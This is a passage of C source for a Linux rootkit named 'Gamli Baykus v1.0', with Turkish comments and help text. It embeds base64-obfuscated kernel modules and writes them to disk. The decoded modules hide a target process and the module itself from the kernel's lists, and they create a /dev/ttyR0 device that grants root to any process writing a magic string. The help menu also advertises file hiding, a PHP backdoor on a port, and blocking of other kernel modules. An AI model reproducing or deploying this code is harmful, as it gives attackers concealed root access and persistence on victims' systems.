lX2luaXQoU2V0SG9va3MpOwptb2R1bGVfZXhpdChIb29rQ2xlYW51cCk7";
  char lsgizle[] = "";

  b64_decode(b64lsgizle,lsgizle);
  FILE *fp;
  fp = fopen(sikim, "w+");
  fprintf(fp, lsgizle);
  fclose(fp);
  printf("[+] Modul Olusturuldu..\n");
   
}



void procseek(char *sikim){
  char b64procs[] = "I2luY2x1ZGUgPGxpbnV4L2luaXQuaD4KI2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPgojaW5jbHVkZSA8bGludXgva2VybmVsLmg+CiNpbmNsdWRlIDxsaW51eC9zY2hlZC5oPgojaW5jbHVkZSA8bGludXgvbGlzdC5oPgojaW5jbHVkZSA8bGludXgvcHJvY19mcy5oPgojaW5jbHVkZSA8bGludXgvcGlkLmg+CiNpbmNsdWRlIDxsaW51eC9waWRfbmFtZXNwYWNlLmg+CiNpbmNsdWRlIDxsaW51eC9rYWxsc3ltcy5oPiAKI2luY2x1ZGUgPGxpbnV4L2hhc2h0YWJsZS5oPgojaW5jbHVkZSA8bGludXgvc2xhYi5oPgovL2luc21vZCBoaWRlcHJvYy5rbyB2ZXJiPTEgdGFyZ2V0X3BpZD0xNTQyNwpNT0RVTEVfTElDRU5TRSgiR1BMIik7CgoKCnN0YXRpYyBhc21saW5rYWdlIHZvaWQgKCpjaGFuZ2VfcGlkUikoc3RydWN0IHRhc2tfc3RydWN0ICp0YXNrLCBlbnVtIHBpZF90eXBlIHR5cGUsIHN0cnVjdCBwaWQgKnBpZCk7CnN0YXRpYyBhc21saW5rYWdlIHN0cnVjdCBwaWQqICgqYWxsb2NfcGlkUikoc3RydWN0IHBpZF9uYW1lc3BhY2UgKm5zKTsKCgoKdm9pZCBtb2R1bGVfaGlkZSh2b2lkKSB7IC8vTW9kdWx1IEdpemxlbWUKICAgbGlzdF9kZWwoJlRISVNfTU9EVUxFLT5saXN0KTsgICAgICAgICAgICAgLy9yZW1vdmUgZnJvbSBwcm9jZnMKICAga29iamVjdF9kZWwoJlRISVNfTU9EVUxFLT5ta29iai5rb2JqKTsgICAgLy9yZW1vdmUgZnJvbSBzeXNmcwogICBUSElTX01PRFVMRS0+c2VjdF9hdHRycyA9IE5VTEw7CiAgIFRISVNfTU9EVUxFLT5ub3Rlc19hdHRycyA9IE5VTEw7Cn0KCgpzdGF0aWMgdm9pZCogZmluZF9zeW0oIGNvbnN0IGNoYXIgKnN5bSApIHsgIAoJc3RhdGljIHVuc2lnbmVkIGxvbmcgZmFkZHIgPSAwOyAgICAgICAgICAKCS8vIC0tLS0tLS0tLS0tIG5lc3RlZCBmdW5jdGlvbnMgYXJlIGEgR0NDIGV4dGVuc2lvbiAtLS0tLS0tLS0gCglpbnQgc3ltYl9mbiggdm9pZCogZGF0YSwgY29uc3QgY2hhciogc3ltLCBzdHJ1Y3QgbW9kdWxlKiBtb2QsIHVuc2lnbmVkIGxvbmcgYWRkciApIHsgCgkJaWYoIDAgPT0gc3RyY21wKCAoY2hhciopZGF0YSwgc3ltICkgKSB7IAoJCQlmYWRkciA9IGFkZHI7IAoJCQlyZXR1cm4gMTsgCgkJfSAKCQllbHNlIHJldHVybiAwOyAKCX07IAoJLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gCglrYWxsc3ltc19vbl9lYWNoX3N5bWJvbCggc3ltYl9mbiwgKHZvaWQqKXN5bSApOyAKCXJldHVybiAodm9pZCopZmFkZHI7IAp9CgoKLy8gTEtNIEFyZ3VtZW50cwpzdGF0aWMgaW50IHRhcmdldF9waWQgPSAwOwptb2R1bGVfcGFyYW0odGFyZ2V0X3BpZCwgaW50LCBTX0lSVVNSIHwgU19JV1VTUiB8IFNfSVJHUlAgfCBTX0lST1RIKTsKTU9EVUxFX1BBUk1fREVTQyh0YXJnZXRfcGlkLCAiVGFyZ2V0IHByb2Nlc3MgUElEIik7CgpzdGF0aWMgaW50IHZlcmIgPSAwOwptb2R1bGVfcGFyYW0odmVyYiwgaW50LCBTX0lSVVNSIHwgU19JV1VTUiB8IFNfSVJHUlAgfCBTX0lST1RIKTsKTU9EVUxFX1BBUk1fREVTQyh2ZXJiLCAiU2V0IHRvIG5vbi0wIHRvIG1ha2UgdGhlIG1vZHVsZSB2ZXJib3NlIik7CgoKLy8gTEtNIEluaXQgZnVuYwpzdGF0aWMgaW50IF9faW5pdCBoaWRlcHJvY19pbml0KHZvaWQpIHsKCiNkZWZpbmUgTkVXUElEIDY1NTM1CgoJbW9kdWxlX2hpZGUoKTsKCXN0cnVjdCBsaXN0X2hlYWQqIHBvcyA9IE5VTEw7CglzdHJ1Y3QgdGFza19zdHJ1Y3QgKnRhc2sgPSBOVUxMLCAqZWxlY3RlZF90YXNrID0gTlVMTCwgKnRhc2tfcHJldiA9IE5VTEwsICp0YXNrX25leHQgPSBOVUxMOwoJc3RydWN0IHBpZCogbmV3cGlkID0gTlVMTDsKCWNoYXIgbmV3X2NvbW1bMTZdID0gezB9OwoJc3RydWN0IGhsaXN0X2hlYWQgKipwcGlkX2hhc2ggPSBOVUxMOwoJc3RydWN0IGhsaXN0X2hlYWQgKnBpZF9oYXNoID0gTlVMTDsKCXN0cnVjdCBobGlzdF9oZWFkICpwaGxpc3QgPSBOVUxMOwoJdW5zaWduZWQgaW50ICpwcGlkaGFzaF9zaGlmdCA9IE5VTEw7Cgl1bnNpZ25lZCBpbnQgcGlkaGFzaF9zaXplID0gMDsKCXVuc2lnbmVkIGludCBwaWRoYXNoX2lkeCA9IDA7CglzdHJ1Y3QgdXBpZCogcHVwaWQgPSBOVUxMOwoJc3RydWN0IGhsaXN0X25vZGUqKiB0b3JlbW92ZSA9IE5VTEw7Cgl1bnNpZ25lZCBpbnQgdG9yZW1vdmVfY250ID0gMCwgdG9yZW1vdmVfaWR4ID0gMDsKCgljaGFuZ2VfcGlkUiA9IGZpbmRfc3ltKCJjaGFuZ2VfcGlkIik7CglhbGxvY19waWRSID0gZmluZF9zeW0oImFsbG9jX3BpZCIpOwoKCWlmICh2ZXJiKSBwcmludGsoS0VSTl9JTkZPICJUYXJnZXQgUElEIGlzICVkIiwgdGFyZ2V0X3BpZCk7CglsaXN0X2Zvcl9lYWNoKHBvcywgJmN1cnJlbnQtPnRhc2tzKSB7CgoJCXRhc2sgPSBsaXN0X2VudHJ5KHBvcywgc3RydWN0IHRhc2tfc3RydWN0LCB0YXNrcyk7IAoJCWlmKHRhc2stPnBpZCA9PSB0YXJnZXRfcGlkKSB7CgkJCWVsZWN0ZWRfdGFzayA9IHRhc2s7CgkJfQoJfQoKCWlmKGVsZWN0ZWRfdGFzayE9TlVMTCkgewoKCQkvKiBVbmNoYWluIHByb2Nlc3MgZnJvbSB0YXNrX3N0cnVjdCBkb3VibGUgbGlua2VkIGxpc3QqLwoJCWlmICh2ZXJiKSBwcmludGsoS0VSTl9JTkZPICJQcm9jZXNzIGlkIGlzICVkIiwgZWxlY3RlZF90YXNrLT5waWQpOwoKCQl0YXNrX25leHQgPSBsaXN0X2VudHJ5KGVsZWN0ZWRfdGFzay0+dGFza3MubmV4dCwgc3RydWN0IHRhc2tfc3RydWN0LCB0YXNrcyk7CgkJdGFza19wcmV2ID0gbGlzdF9lbnRyeShlbGVjdGVkX3Rhc2stPnRhc2tzLnByZXYsIHN0cnVjdCB0YXNrX3N0cnVjdCwgdGFza3MpOwoJCWlmKHZlcmIpIHsKCQkJcHJpbnRrKEtFUk5fSU5GTyAiTmV4dCBwcm9jZXNzIGlzICVzIiwgdGFza19uZXh0LT5jb21tKTsKCQkJcHJpbnRrKEtFUk5fSU5GTyAiUHJldiBwcm9jZXNzIGlzICVzIiwgdGFza19wcmV2LT5jb21tKTsKCQl9CgoJCW1lbWNweShlbGVjdGVkX3Rhc2stPmNvbW0sIG5ld19jb21tLCAxNik7CgkKCQl0YXNrX3ByZXYtPnRhc2tzLm5leHQgPSBlbGVjdGVkX3Rhc2stPnRhc2tzLm5leHQ7CgkJdGFza19uZXh0LT50YXNrcy5wcmV2ID0gZWxlY3RlZF90YXNrLT50YXNrcy5wcmV2OwoKCQllbGVjdGVkX3Rhc2stPnRhc2tzLm5leHQgPSAmKGVsZWN0ZWRfdGFzay0+dGFza3MpOwoJCWVsZWN0ZWRfdGFzay0+dGFza3MucHJldiA9ICYoZWxlY3RlZF90YXNrLT50YXNrcyk7CgoJCQoJCS8qIENoYW5nZSBQSUQgKi8KCQluZXdwaWQgPSBhbGxvY19waWRSKHRhc2tfYWN0aXZlX3BpZF9ucyhlbGVjdGVkX3Rhc2spKTsKCQluZXdwaWQtPm51bWJlcnNbMF0ubnIgPSBORVdQSUQ7CgkJY2hhbmdlX3BpZFIoZWxlY3RlZF90YXNrLCBQSURUWVBFX1BJRCwgbmV3cGlkKTsKCQllbGVjdGVkX3Rhc2stPnBpZCA9IE5FV1BJRDsKCgoJCS8qIFJlbW92ZSBwcm9jZXNzIGZyb20gcGlkIGhhc2ggdGFibGUgKi8KCQlwcGlkX2hhc2ggPSBmaW5kX3N5bSgicGlkX2hhc2giKTsKCQlwaWRfaGFzaCA9ICpwcGlkX2hhc2g7CgkJcHBpZGhhc2hfc2hpZnQgPSBmaW5kX3N5bSgicGlkaGFzaF9zaGlmdCIpOwoJCXBpZGhhc2hfc2l6ZSA9IDEgPDwgKCpwcGlkaGFzaF9zaGlmdCk7CgoKCQlmb3IocGlkaGFzaF9pZHg9MDsgcGlkaGFzaF9pZHg8cGlkaGFzaF9zaXplOyBwaWRoYXNoX2lkeCsrKSB7CgoJCQlwaGxpc3QgPSAmcGlkX2hhc2hbcGlkaGFzaF9pZHhdOwoJCQlpZighaGxpc3RfZW1wdHkocGhsaXN0KSkgewoJCQkJCgkJCQlobGlzdF9mb3JfZWFjaF9lbnRyeShwdXBpZCwgcGhsaXN0LCBwaWRfY2hhaW4pIHsKCQkJCQoJCQkJCWlmKHB1cGlkLT5uciA9PSB0YXJnZXRfcGlkIHx8IHB1cGlkLT5uciA9PSBORVdQSUQpIHsKCgkJCQkJCXRvcmVtb3ZlX2NudCsrOwoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCgkJcHJpbnRrKEtFUk5fSU5GTyAiTnVtYmVyIG9mIGVsZW1lbnRzIHRvIHJlbW92ZTogJWQiLCB0b3JlbW92ZV9jbnQpOwoJCXRvcmVtb3ZlID0gKHN0cnVjdCBobGlzdF9ub2RlKiopIGttYWxsb2ModG9yZW1vdmVfY250ICogc2l6ZW9mKHN0cnVjdCBobGlzdF9ub2RlKiksIEdGUF9LRVJORUwpOwoKCQlpZighdG9yZW1vdmUpCgkJCXJldHVybiAtRU5PTUVNOwoKCQlmb3IocGlkaGFzaF9pZHg9MDsgcGlkaGFzaF9pZHg8cGlkaGFzaF9zaXplOyBwaWRoYXNoX2lkeCsrKSB7CgoJCQlwaGxpc3QgPSAmcGlkX2hhc2hbcGlkaGFzaF9pZHhdOwoJCQlpZighaGxpc3RfZW1wdHkocGhsaXN0KSkgewoJCQkJCgkJCQlobGlzdF9mb3JfZWFjaF9lbnRyeShwdXBpZCwgcGhsaXN0LCBwaWRfY2hhaW4pIHsKCQkJCQoJCQkJCWlmKHB1cGlkLT5uciA9PSB0YXJnZXRfcGlkIHx8IHB1cGlkLT5uciA9PSBORVdQSUQpIHsKCQkJCQkKCQkJCQkJdG9yZW1vdmVbdG9yZW1vdmVfaWR4KytdID0gJihwdXBpZC0+cGlkX2NoYWluKTsKCQkJCQl9CgkJCQl9CgkJCX0KCQl9CgoJCWZvcih0b3JlbW92ZV9jbnQgPSAwOyB0b3JlbW92ZV9jbnQ8dG9yZW1vdmVfaWR4OyB0b3JlbW92ZV9jbnQrKykgewoKCQkJaGxpc3RfZGVsKHRvcmVtb3ZlW3RvcmVtb3ZlX2NudF0pOwoJCX0KCgkJa2ZyZWUodG9yZW1vdmUpOwoJfQoKCXJldHVybiAwOwp9CgoKLy8gTEtNIEV4aXQgZnVuYwpzdGF0aWMgdm9pZCBfX2V4aXQgaGlkZXByb2NfZXhpdCh2b2lkKSB7CgoJaWYgKHZlcmIpIHByaW50ayhLRVJOX0lORk8gIkdvb2RieWUsIFdvcmxkIVxuIik7Cn0KCgovLyBSZWdpc3RlciBpbml0ICYgZXhpdCBmdW5jcwptb2R1bGVfaW5pdChoaWRlcHJvY19pbml0KTsKbW9kdWxlX2V4aXQoaGlkZXByb2NfZXhpdCk7";
    char procs[] = "";

  b64_decode(b64procs,procs);
  FILE *fc;
  fc = fopen(sikim, "w+");
  fprintf(fc, procs);
  fclose(fc);
  printf("[+] Modul Olusturuldu..\n");
   
}


void rootdevice(char *sikim){
  char b64rootdevice[] = "I2luY2x1ZGUgPGxpbnV4L2luaXQuaD4gICAKI2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPiAKI2luY2x1ZGUgPGxpbnV4L2tlcm5lbC5oPgojaW5jbHVkZSA8bGludXgvZGV2aWNlLmg+CiNpbmNsdWRlIDxsaW51eC9mcy5oPiAgICAKI2luY2x1ZGUgPGFzbS91YWNjZXNzLmg+CiNpbmNsdWRlIDxsaW51eC9zbGFiLmg+CiNpbmNsdWRlIDxsaW51eC9zeXNjYWxscy5oPgojaW5jbHVkZSA8bGludXgvdHlwZXMuaD4KI2luY2x1ZGUgPGxpbnV4L2NkZXYuaD4KI2luY2x1ZGUgPGxpbnV4L2NyZWQuaD4KI2luY2x1ZGUgPGxpbnV4L3ZlcnNpb24uaD4KCi8vZWNobyAiZzB0UjBvdCIgPiAvZGV2L3R0eVIwCgojZGVmaW5lICBERVZJQ0VfTkFNRSAidHR5UjAiIAojZGVmaW5lICBDTEFTU19OQU1FICAidHR5UiIgIAoKI2lmIExJTlVYX1ZFUlNJT05fQ09ERSA+IEtFUk5FTF9WRVJTSU9OKDMsNCwwKQojZGVmaW5lIFYoeCkgeC52YWwKI2Vsc2UKI2RlZmluZSBWKHgpIHgKI2VuZGlmCgovLyBQcm90b3R5cGVzCnN0YXRpYyBpbnQgICAgIF9faW5pdCByb290X2luaXQodm9pZCk7CnN0YXRpYyB2b2lkICAgIF9fZXhpdCByb290X2V4aXQodm9pZCk7CnN0YXRpYyBpbnQgICAgIHJvb3Rfb3BlbiAgKHN0cnVjdCBpbm9kZSAqaW5vZGUsIHN0cnVjdCBmaWxlICpmKTsKc3RhdGljIHNzaXplX3Qgcm9vdF9yZWFkICAoc3RydWN0IGZpbGUgKmYsIGNoYXIgKmJ1Ziwgc2l6ZV90IGxlbiwgbG9mZl90ICpvZmYpOwpzdGF0aWMgc3NpemVfdCByb290X3dyaXRlIChzdHJ1Y3QgZmlsZSAqZiwgY29uc3QgY2hhciBfX3VzZXIgKmJ1Ziwgc2l6ZV90IGxlbiwgbG9mZl90ICpvZmYpOwoKCi8vIE1vZHVsZSBpbmZvCk1PRFVMRV9MSUNFTlNFKCJHUEwiKTsgCgoKc3RhdGljIGludCAgICAgICAgICAgIG1ham9yTnVtYmVyOyAKc3RhdGljIHN0cnVjdCBjbGFzcyogIHJvb3RjaGFyQ2xhc3MgID0gTlVMTDsKc3RhdGljIHN0cnVjdCBkZXZpY2UqIHJvb3RjaGFyRGV2aWNlID0gTlVMTDsKCnN0YXRpYyBzdHJ1Y3QgZmlsZV9vcGVyYXRpb25zIGZvcHMgPQp7CiAgLm93bmVyID0gVEhJU19NT0RVTEUsCiAgLm9wZW4gPSByb290X29wZW4sCiAgLnJlYWQgPSByb290X3JlYWQsCiAgLndyaXRlID0gcm9vdF93cml0ZSwKfTsKCgp2b2lkIG1vZHVsZV9oaWRlKHZvaWQpIHsgIC8vR2l6bGVtZQogICBsaXN0X2RlbCgmVEhJU19NT0RVTEUtPmxpc3QpOyAgICAgICAgICAgICAvL3JlbW92ZSBmcm9tIHByb2NmcwogICBrb2JqZWN0X2RlbCgmVEhJU19NT0RVTEUtPm1rb2JqLmtvYmopOyAgICAvL3JlbW92ZSBmcm9tIHN5c2ZzCiAgIFRISVNfTU9EVUxFLT5zZWN0X2F0dHJzID0gTlVMTDsKICAgVEhJU19NT0RVTEUtPm5vdGVzX2F0dHJzID0gTlVMTDsKfQoKCnN0YXRpYyBpbnQKcm9vdF9vcGVuIChzdHJ1Y3QgaW5vZGUgKmlub2RlLCBzdHJ1Y3QgZmlsZSAqZikKewogICByZXR1cm4gMDsKfQoKc3RhdGljIHNzaXplX3QKcm9vdF9yZWFkIChzdHJ1Y3QgZmlsZSAqZiwgY2hhciAqYnVmLCBzaXplX3QgbGVuLCBsb2ZmX3QgKm9mZikKewogIHJldHVybiBsZW47Cn0KCnN0YXRpYyBjaGFyICptYWdpYzsKbW9kdWxlX3BhcmFtKG1hZ2ljLCBjaGFycCwgMDAwMCk7Ck1PRFVMRV9QQVJNX0RFU0MobWFnaWMsICJBIGNoYXJhY3RlciBzdHJpbmciKTsKCgoKc3RhdGljIHNzaXplX3QKcm9vdF93cml0ZSAoc3RydWN0IGZpbGUgKmYsIGNvbnN0IGNoYXIgX191c2VyICpidWYsIHNpemVfdCBsZW4sIGxvZmZfdCAqb2ZmKQp7IAogIGNoYXIgICAqZGF0YTsKICBzdHJ1Y3QgY3JlZCAqbmV3X2NyZWQ7CiAgCiAgZGF0YSA9IChjaGFyICopIGttYWxsb2MgKGxlbiArIDEsIEdGUF9LRVJORUwpOwogICAgCiAgaWYgKGRhdGEpCiAgICB7CiAgICAgIGNvcHlfZnJvbV91c2VyIChkYXRhLCBidWYsIGxlbik7CiAgICAgICAgaWYgKG1lbWNtcChkYXRhLCBtYWdpYywgNykgPT0gMCkKICAgIHsKICAgICAgaWYgKChuZXdfY3JlZCA9IHByZXBhcmVfY3JlZHMgKCkpID09IE5VTEwpCiAgICAgICAgewogICAgcHJpbnRrICgidHR5Uks6IENhbm5vdCBwcmVwYXJlIGNyZWRlbnRpYWxzXG4iKTsKICAgIHJldHVybiAwOwogICAgICAgIH0KICAgICAgcHJpbnRrICgidHR5Uks6IFlvdSBnb3QgaXQuXG4iKTsKICAgICAgVihuZXdfY3JlZC0+dWlkKSA9IFYobmV3X2NyZWQtPmdpZCkgPSAgMDsKICAgICAgVihuZXdfY3JlZC0+ZXVpZCkgPSBWKG5ld19jcmVkLT5lZ2lkKSA9IDA7CiAgICAgIFYobmV3X2NyZWQtPnN1aWQpID0gVihuZXdfY3JlZC0+c2dpZCkgPSAwOwogICAgICBWKG5ld19jcmVkLT5mc3VpZCkgPSBWKG5ld19jcmVkLT5mc2dpZCkgPSAwOwogICAgICBjb21taXRfY3JlZHMgKG5ld19jcmVkKTsKICAgIH0KICAgICAgICBrZnJlZShkYXRhKTsKICAgICAgfQogICAgZWxzZQogICAgICB7CiAgcHJpbnRrKEtFUk5fQUxFUlQgInR0eVJLOlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkiKTsKICAgICAgfQogICAgCiAgICByZXR1cm4gbGVuOwp9CgoKc3RhdGljIGludCBfX2luaXQKcm9vdF9pbml0KHZvaWQpCnsKICBtb2R1bGVfaGlkZSgpOy8vZ2l6bGUKICBwcmludGsgKCJ0dHlSSzogTEtNIGluc3RhbGxlZCFcbiIpOwogIC8vIENyZWF0ZSBjaGFyIGRldmljZQogIGlmICgobWFqb3JOdW1iZXIgPSByZWdpc3Rlcl9jaHJkZXYoMCwgREVWSUNFX05BTUUsICZmb3BzKSkgPCAwKQogICAgewogICAgICBwcmludGsoS0VSTl9BTEVSVCAidHR5UksgZmFpbGVkIHRvIHJlZ2lzdGVyIGEgbWFqb3IgbnVtYmVyXG4iKTsKICAgICAgcmV0dXJuIG1ham9yTnVtYmVyOwogICAgfQogICBwcmludGsoS0VSTl9JTkZPICJ0dHlSSzogbWFqb3IgbnVtYmVyICVkXG4iLCBtYWpvck51bWJlcik7CiAKICAgLy8gUmVnaXN0ZXIgdGhlIGRldmljZSBjbGFzcwogICByb290Y2hhckNsYXNzID0gY2xhc3NfY3JlYXRlKFRISVNfTU9EVUxFLCBDTEFTU19OQU1FKTsKICAgaWYgKElTX0VSUihyb290Y2hhckNsYXNzKSkKICAgICB7CiAgICAgICB1bnJlZ2lzdGVyX2NocmRldihtYWpvck51bWJlciwgREVWSUNFX05BTUUpOwogICAgICAgcHJpbnRrKEtFUk5fQUxFUlQgInR0eVJLOiBGYWlsZWQgdG8gcmVnaXN0ZXIgZGV2aWNlIGNsYXNzXG4iKTsKICAgICAgIHJldHVybiBQVFJfRVJSKHJvb3RjaGFyQ2xhc3MpOyAKICAgfQoKICAgcHJpbnRrKEtFUk5fSU5GTyAidHR5Uks6IGRldmljZSBjbGFzcyByZWdpc3RlcmVkIGNvcnJlY3RseVxuIik7CiAKICAgLy8gUmVnaXN0ZXIgdGhlIGRldmljZSBkcml2ZXIKICAgcm9vdGNoYXJEZXZpY2UgPSBkZXZpY2VfY3JlYXRlKHJvb3RjaGFyQ2xhc3MsIE5VTEwsCiAgICAgICAgICBNS0RFVihtYWpvck51bWJlciwgMCksIE5VTEwsIERFVklDRV9OQU1FKTsKICAgaWYgKElTX0VSUihyb290Y2hhckRldmljZSkpCiAgICAgewogICAgICAgY2xhc3NfZGVzdHJveShyb290Y2hhckNsYXNzKTsKICAgICAgIHVucmVnaXN0ZXJfY2hyZGV2KG1ham9yTnVtYmVyLCBERVZJQ0VfTkFNRSk7CiAgICAgICBwcmludGsoS0VSTl9BTEVSVCAidHR5Uks6IEZhaWxlZCB0byBjcmVhdGUgdGhlIGRldmljZVxuIik7CiAgICAgICByZXR1cm4gUFRSX0VSUihyb290Y2hhckRldmljZSk7CiAgICAgfQoKICAgIHJldHVybiAwOwogICAgCn0KCnN0YXRpYyB2b2lkIF9fZXhpdApyb290X2V4aXQodm9pZCkgCnsKICAvLyBEZXN0cm95IHRoZSBkZXZpY2UKICBkZXZpY2VfZGVzdHJveShyb290Y2hhckNsYXNzLCBNS0RFVihtYWpvck51bWJlciwgMCkpOwogIGNsYXNzX3VucmVnaXN0ZXIocm9vdGNoYXJDbGFzcyk7ICAgICAgICAgICAgICAgICAgICAgCiAgY2xhc3NfZGVzdHJveShyb290Y2hhckNsYXNzKTsgICAgICAgICAgICAgICAgICAgICAgICAKICB1bnJlZ2lzdGVyX2NocmRldihtYWpvck51bWJlciwgREVWSUNFX05BTUUpOyAgICAgCgogIHByaW50aygiQnllZSFcbiIpOwp9CgoKbW9kdWxlX2luaXQocm9vdF9pbml0KTsKbW9kdWxlX2V4aXQocm9vdF9leGl0KTs=";
    char rootdevice[] = "";

  b64_decode(b64rootdevice,rootdevice);
  FILE *fk;
  fk = fopen(sikim, "w+");
  fprintf(fk, rootdevice);
  fclose(fk);
  printf("[+] Modul Olusturuldu..\n");
   
}


char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void decodeblock(unsigned char in[], char *clrstr) {
  unsigned char out[4];
  out[0] = in[0] << 2 | in[1] >> 4;
  out[1] = in[1] << 4 | in[2] >> 2;
  out[2] = in[2] << 6 | in[3] >> 0;
  out[3] = '\0';
  strncat(clrstr, out, sizeof(out));
}

void b64_decode(char *b64src, char *clrdst) {
  int c, phase, i;
  unsigned char in[4];
  char *p;

  clrdst[0] = '\0';
  phase = 0; i=0;
  while(b64src[i]) {
    c = (int) b64src[i];
    if(c == '=') {
      decodeblock(in, clrdst); 
      break;
    }
    p = strchr(b64, c);
    if(p) {
      in[phase] = p - b64;
      phase = (phase + 1) % 4;
      if(phase == 0) {
        decodeblock(in, clrdst);
        in[0]=in[1]=in[2]=in[3]=0;
      }
    }
    i++;
  }
}

void encodeblock( unsigned char in[], char b64str[], int len ) {
    unsigned char out[5];
    out[0] = b64[ in[0] >> 2 ];
    out[1] = b64[ ((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4) ];
    out[2] = (unsigned char) (len > 1 ? b64[ ((in[1] & 0x0f) << 2) |
             ((in[2] & 0xc0) >> 6) ] : '=');
    out[3] = (unsigned char) (len > 2 ? b64[ in[2] & 0x3f ] : '=');
    out[4] = '\0';
    strncat(b64str, out, sizeof(out));
}

void b64_encode(char *clrstr, char *b64dst) {
  unsigned char in[3];
  int i, len = 0;
  int j = 0;

  b64dst[0] = '\0';
  while(clrstr[j]) {
    len = 0;
    for(i=0; i<3; i++) {
     in[i] = (unsigned char) clrstr[j];
     if(clrstr[j]) {
        len++; j++;
      }
      else in[i] = 0;
    }
    if( len ) {
      encodeblock( in, b64dst, len );
    }
  }
}

void helperr(){	

    printf(
     "                                                                          \n"
     "        Usage: ./gamlibaykus [OPTION]                                     \n"
     "                                                                          \n"
     "        ./gamlibaykus -help                                               \n"	
     "                                                                          \n"	      
     "       ================= [ Rootkit Functions ] =================          \n"
     "                                                                          \n"    
     "       -fileseek (Hedef Dosyayi Gizle)                                    \n"
     "                                                                          \n"
     "       -procseek (Hedef Processi Gizle)                                   \n"
     "                                                                          \n"
     "       -rootdevice (Root Yetkisi icin bir device olustur)                 \n"
     "                                                                          \n"
     "       -insdoor (Porta PHP Tabanli Backdoor Ara yuzunu kur)               \n"
     "                                                                          \n"   
     "       -locklkm (Harici LKM leri Engelleme)                               \n"
     "                                                                          \n"      
     "       -uninstall (Butun LKM leri , Yapilan tum degisiklikleri Kaldir)    \n\n");	
		
}




void banner(){
	system("clear");
	printf(
	
	
"                ooooooooooooo                  \n"
"       ouooooo,~oo         oo~,ooooouo         \n"
"       8     ~88888.     ,88888~     8         \n"
"       8      go~~~os   go~~~os      8         \n"
"       8     8       8_8       8.    8         \n"
"       8    8    _    8    _    8    8         \n"
"       8    8   !@!   8   !@!   8    8         \n"
"       8    8i        8        i8    8         \n"
"       8     8s     g8 8s     s8     8         \n"
"       8      dooooo 8_8 ooooob      8         \n"
"       8     d!       V       !b     8         \n"
"       8     8        ~        8     8         \n"
"       8     8                 8     8         \n"
"       8   ] 8      0x00fy     8 [   8         \n"
"       8 [ ] 8                 8 [ ] 8         \n"
"       8 [ ] !8               8| [ ] 8         \n"
"       8 [ ]s88b-oo- xxx -oo-d88s[ ] 8         \n"
"       8 [ 88  8i     ~     i8  88 ] 8         \n"
"       8 88    88s 88   88 gf8    88 8         \n"
"       888   ,g8s/8. ooo  8 g8s.   888         \n"
"       88   i888888fo_X_of888888i   88         \n"
"       V    YY  ~    ~~~     ~ YY    V         \n"
"                                               \n"
"       =====[ Gamli Baykus v1.0 ]=====         \n"
"   ======== [   Modebit0.info   ]=========	    \n"
"	                                            \n\n");
	
}
